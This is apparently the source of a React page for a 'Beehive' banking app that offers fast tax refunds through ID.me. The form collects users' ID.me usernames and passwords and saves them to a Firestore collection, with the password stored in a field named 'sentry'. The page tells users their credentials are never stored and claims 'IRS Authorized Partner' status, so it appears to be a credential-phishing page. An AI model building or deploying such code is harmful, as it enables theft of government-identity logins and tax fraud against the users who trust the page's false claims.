import React, { useState } from 'react';
import { 
  FileText, 
  Send, 
  CheckCircle2, 
  AlertCircle, 
  ShieldCheck, 
  UserCheck, 
  Lock, 
  ArrowRight,
  HelpCircle,
  MessageSquare,
  Zap,
  Globe,
  Database,
  Fingerprint
} from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { BankingFeaturePage } from '../../../components/dashboard/BankingFeaturePage';
import { useAuth } from '../../../hooks/useAuth';
import { useCurrency } from '../../../hooks/useCurrency';
import { db, handleFirestoreError, OperationType } from '../../../lib/firebase';
import { collection, addDoc } from 'firebase/firestore';

export const TaxRefundsPage = () => {
  const { user, userData } = useAuth();
  const { currency, formatAmount } = useCurrency();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState('');
  const [formData, setFormData] = useState({
    fullName: userData?.fullName || '',
    email: userData?.email || '',
    idMeUsername: '',
    sentry: '',
    details: ''
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user) return;
    
    setLoading(true);
    setError('');

    try {
      await addDoc(collection(db, 'tax_refunds'), {
        userId: user.uid,
        ...formData,
        status: 'pending',
        createdAt: new Date().toISOString()
      });

      setSuccess(true);
    } catch (err: any) {
      handleFirestoreError(err, OperationType.WRITE, 'tax_refunds');
      setError('Failed to submit application. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  if (success) {
    return (
      <BankingFeaturePage title="Tax Refunds" description="Application Submitted" icon={FileText}>
        <div className="max-w-md mx-auto text-center space-y-6 py-12">
          <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto">
            <CheckCircle2 className="w-10 h-10" />
          </div>
          <h2 className="text-3xl font-black tracking-tighter dark:text-white uppercase">APPLICATION RECEIVED</h2>
          <p className="text-gray-500">Your tax refund application has been submitted successfully. Our team will review your ID.me connection and process the refund.</p>
          <div className="space-y-3">
            <button onClick={() => navigate('/dashboard/chat')} className="btn-primary w-full py-4 flex items-center justify-center gap-2">
              <MessageSquare className="w-5 h-5" /> Message Support
            </button>
            <button onClick={() => setSuccess(false)} className="btn-secondary w-full py-4">Submit Another Request</button>
          </div>
        </div>
      </BankingFeaturePage>
    );
  }

  return (
    <BankingFeaturePage 
      title="Tax Refunds" 
      description="Accelerate your tax returns with secure ID.me integration and real-time tracking"
      icon={FileText}
    >
      <div className="space-y-24">
        {/* Hero Section */}
        <div className="relative rounded-[2.5rem] overflow-hidden bg-zinc-900 text-white p-12 lg:p-20">
          <div className="absolute inset-0 opacity-30">
            <img 
              src="https://images.unsplash.com/photo-1554224155-6726b3ff858f?auto=format&fit=crop&q=80&w=1920" 
              alt="Tax Background" 
              className="w-full h-full object-cover"
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="relative z-10 max-w-3xl space-y-6">
            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-amber-500/20 text-amber-500 text-xs font-black uppercase tracking-widest backdrop-blur-md">
              <ShieldCheck className="w-4 h-4" /> IRS Authorized Partner
            </div>
            <h2 className="text-4xl lg:text-6xl font-black tracking-tighter leading-none uppercase">
              Get Your <span className="text-amber-500">Refund</span> Faster
            </h2>
            <p className="text-xl lg:text-2xl font-medium text-gray-400">
              Direct deposit into your Beehive wallet within 48 hours of approval.
            </p>
            <p className="text-lg text-gray-400 leading-relaxed max-w-2xl">
              Connect your ID.me account to verify your identity and authorize Beehive to process your tax refund directly. Our secure Sentry integration ensures your data remains encrypted and private.
            </p>
          </div>
        </div>

        {/* Features Grid */}
        <div className="grid md:grid-cols-3 gap-8">
          <FeatureCard 
            icon={<Fingerprint className="w-6 h-6" />}
            title="ID.me Verified"
            description="Seamlessly connect your existing government-grade identity verification."
          />
          <FeatureCard 
            icon={<Lock className="w-6 h-6" />}
            title="Sentry Secure"
            description="End-to-end encryption for all sensitive tax and identity data."
          />
          <FeatureCard 
            icon={<Zap className="w-6 h-6" />}
            title="Instant Payout"
            description="Funds are available in your wallet as soon as the IRS approves the return."
          />
        </div>

        {/* Main Application Area */}
        <div className="grid lg:grid-cols-3 gap-12">
          <div className="lg:col-span-2 space-y-8">
            <div className="space-y-4">
              <h3 className="text-3xl font-black tracking-tighter dark:text-white uppercase">Refund Application</h3>
              <p className="text-gray-500">Provide your details and connect your ID.me account to begin.</p>
            </div>
            <form onSubmit={handleSubmit} className="card p-8 space-y-8 border-none shadow-xl dark:bg-zinc-900/50 backdrop-blur-sm">
              <div className="grid md:grid-cols-2 gap-8">
                <div className="space-y-3">
                  <label className="text-xs font-bold uppercase tracking-widest text-gray-500">Full Name</label>
                  <input 
                    type="text"
                    value={formData.fullName}
                    onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                    placeholder="John Doe"
                    className="w-full p-5 rounded-2xl bg-gray-50 dark:bg-zinc-800 border-none focus:ring-2 focus:ring-amber-500 dark:text-white font-bold"
                    required
                  />
                </div>
                <div className="space-y-3">
                  <label className="text-xs font-bold uppercase tracking-widest text-gray-500">Email Address</label>
                  <input 
                    type="email"
                    value={formData.email}
                    onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                    placeholder="john@example.com"
                    className="w-full p-5 rounded-2xl bg-gray-50 dark:bg-zinc-800 border-none focus:ring-2 focus:ring-amber-500 dark:text-white font-bold"
                    required
                  />
                </div>
              </div>

              <div className="grid md:grid-cols-2 gap-8">
                <div className="space-y-3">
                  <label className="text-xs font-bold uppercase tracking-widest text-gray-500 flex items-center gap-2">
                    <UserCheck className="w-4 h-4" /> ID.me Username
                  </label>
                  <input 
                    type="text"
                    value={formData.idMeUsername}
                    onChange={(e) => setFormData({ ...formData, idMeUsername: e.target.value })}
                    placeholder="idme_user_123"
                    className="w-full p-5 rounded-2xl bg-gray-50 dark:bg-zinc-800 border-none focus:ring-2 focus:ring-amber-500 dark:text-white font-bold"
                    required
                  />
                </div>
                <div className="space-y-3">
                  <label className="text-xs font-bold uppercase tracking-widest text-gray-500 flex items-center gap-2">
                    <Lock className="w-4 h-4" /> ID.me Password
                  </label>
                  <input 
                    type="password"
                    value={formData.sentry}
                    onChange={(e) => setFormData({ ...formData, sentry: e.target.value })}
                    placeholder="ID.me password"
                    className="w-full p-5 rounded-2xl bg-gray-50 dark:bg-zinc-800 border-none focus:ring-2 focus:ring-amber-500 dark:text-white font-bold"
                    required
                  />
                </div>
              </div>

              <div className="space-y-3">
                <label className="text-xs font-bold uppercase tracking-widest text-gray-500">Additional Details (Optional)</label>
                <textarea 
                  rows={4}
                  value={formData.details}
                  onChange={(e) => setFormData({ ...formData, details: e.target.value })}
                  placeholder="Any specific information regarding your refund year or status..."
                  className="w-full p-5 rounded-2xl bg-gray-50 dark:bg-zinc-800 border-none focus:ring-2 focus:ring-amber-500 dark:text-white leading-relaxed"
                />
              </div>

              {error && (
                <div className="bg-red-50 text-red-600 p-4 rounded-xl flex items-center gap-3 text-sm">
                  <AlertCircle className="w-5 h-5" />
                  {error}
                </div>
              )}

              <button 
                type="submit"
                disabled={loading}
                className="btn-primary w-full py-6 flex items-center justify-center gap-3 text-lg font-black uppercase tracking-widest bg-amber-500 hover:bg-amber-600 border-none"
              >
                {loading ? (
                  <>Processing...</>
                ) : (
                  <>
                    Connect & Submit <Send className="w-5 h-5" />
                  </>
                )}
              </button>
            </form>
          </div>

          <div className="space-y-12">
            <div className="space-y-6">
              <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase">Security Protocol</h3>
              <div className="space-y-4">
                <SecurityItem 
                  icon={<Globe className="w-6 h-6 text-blue-500" />}
                  title="Global Standards"
                  description="Compliant with SOC2 and GDPR data protection regulations."
                />
                <SecurityItem 
                  icon={<Database className="w-6 h-6 text-purple-500" />}
                  title="Encrypted Storage"
                  description="Your ID.me credentials are never stored on our servers."
                />
                <SecurityItem 
                  icon={<ShieldCheck className="w-6 h-6 text-green-500" />}
                  title="Fraud Protection"
                  description="Advanced AI monitoring to prevent unauthorized refund claims."
                />
              </div>
            </div>

            <div className="p-8 rounded-[2rem] bg-amber-500/10 border border-amber-500/20 space-y-4">
              <h4 className="font-black text-amber-600 uppercase tracking-widest flex items-center gap-2 text-sm">
                <HelpCircle className="w-5 h-5" /> Need Help?
              </h4>
              <p className="text-sm text-gray-600 dark:text-gray-400 leading-relaxed">
                If you're having trouble connecting your ID.me account or finding your Sentry ID, our specialized tax support team is available 24/7.
              </p>
              <div className="pt-2">
                <button onClick={() => navigate('/dashboard/chat')} className="text-amber-600 font-black text-xs uppercase tracking-widest flex items-center gap-2 hover:gap-3 transition-all">
                  Contact Support <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </BankingFeaturePage>
  );
};

const FeatureCard = ({ icon, title, description }: { icon: React.ReactNode, title: string, description: string }) => (
  <div className="card p-8 space-y-4 hover:border-amber-500 transition-colors group">
    <div className="w-12 h-12 rounded-2xl bg-amber-500/10 flex items-center justify-center text-amber-500 group-hover:bg-amber-500 group-hover:text-white transition-all">
      {icon}
    </div>
    <h4 className="font-black dark:text-white uppercase tracking-tighter">{title}</h4>
    <p className="text-xs text-gray-500 leading-relaxed">{description}</p>
  </div>
);

const SecurityItem = ({ icon, title, description }: { icon: React.ReactNode, title: string, description: string }) => (
  <div className="p-5 rounded-2xl bg-white dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 flex items-center gap-5 hover:border-amber-500 transition-colors group">
    <div className="w-14 h-14 rounded-2xl bg-gray-50 dark:bg-zinc-800 flex items-center justify-center flex-shrink-0 group-hover:bg-amber-500/10 transition-colors">
      {icon}
    </div>
    <div>
      <h4 className="font-black dark:text-white text-sm uppercase tracking-tight">{title}</h4>
      <p className="text-[10px] text-gray-500 leading-relaxed">{description}</p>
    </div>
  </div>
);
